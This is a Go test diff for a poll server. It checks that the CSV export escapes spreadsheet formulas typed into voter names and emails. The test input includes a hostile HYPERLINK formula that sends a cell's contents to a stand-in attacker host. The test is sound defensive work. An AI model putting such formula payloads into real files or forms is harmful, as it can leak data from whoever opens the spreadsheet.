@@ -1,6 +1,7 @@
 package server
 
 import (
+	"encoding/csv"
 	"net/http"
 	"net/url"
 	"strings"
@@ -201,4 +202,52 @@ func TestCSVExport(t *testing.T) {
 	if resp.Request.URL.Path != "/login" || strings.Contains(resp.Header.Get("Content-Type"), "text/csv") {
 		t.Errorf("csv served without authorization (landed on %s)", resp.Request.URL.Path)
 	}
+}
+
+// TestCSVExportNeutralizesFormulas covers the one direction in which a
+// voter can reach the organizer's machine: the name they type is
+// written into a file the organizer opens in a spreadsheet.
+func TestCSVExportNeutralizesFormulas(t *testing.T) {
+	ts, _ := newTestServer(t)
+	adminPath := createPoll(t, ts, nil)
+	public := pollPath(adminPath)
+	_, body := get(t, ts, public, nil)
+	ids := optionIDs(t, body)
+
+	hostile := `=HYPERLINK("http://evil.example/"&A1,"Click")`
+	cPost(t, jarClient(t), ts.URL+public+"/participants", url.Values{
+		"name": {hostile}, "email": {"+1234@example.com"},
+		"vote_" + ids[0]: {"yes"},
+	})
+
+	resp, csvBody := get(t, ts, adminPath+"/export.csv", nil)
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("export: %d", resp.StatusCode)
+	}
+	// No cell starts on a sigil the spreadsheet would evaluate, and the
+	// text still survives behind the escape — the organizer has to be
+	// able to read the name they were given.
+	recs := parseCSV(t, csvBody)
+	for _, rec := range recs {
+		for _, cell := range rec {
+			if cell != "" && strings.IndexByte("=+-@\t\r", cell[0]) >= 0 {
+				t.Errorf("cell %q would be evaluated as a formula", cell)
+			}
+		}
+	}
+	if got := recs[1][0]; got != "'"+hostile {
+		t.Errorf("name cell = %q, want the escaped original", got)
+	}
+	if got := recs[1][1]; got != "'+1234@example.com" {
+		t.Errorf("email cell = %q, want the escaped original", got)
+	}
+}
+
+func parseCSV(t *testing.T, body string) [][]string {
+	t.Helper()
+	recs, err := csv.NewReader(strings.NewReader(body)).ReadAll()
+	if err != nil {
+		t.Fatalf("the export is not valid CSV: %v", err)
+	}
+	return recs
 }
